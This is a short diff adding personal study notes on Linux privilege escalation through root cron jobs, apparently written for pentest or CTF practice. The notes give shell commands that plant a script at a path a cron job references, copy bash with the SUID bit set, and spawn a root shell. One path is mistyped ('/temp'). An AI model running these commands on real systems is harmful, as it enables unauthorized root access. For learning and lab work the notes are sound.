@@ -1,0 +1,20 @@
+Escalation via Cron Paths:
+
+-Documentation:
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
+
+Find Crown Tab: 
+    cat /etc/crontab:
+        focus on * * * * * root comand or file
+
+    la -la /home/usr 
+        IF we don<t find the file we can create a "malicious" file with the same name found
+
+        echo 'cp /bin/bash /temp/bash; chmod +s /tmp/bash' > /home/user/WantedFileName.sh 
+        chmod +x /home/usr/WantedFileName.sh
+
+        We will wait 1 min 
+        ls -la /tmp
+        /tmp/bash -p 
+        whoami
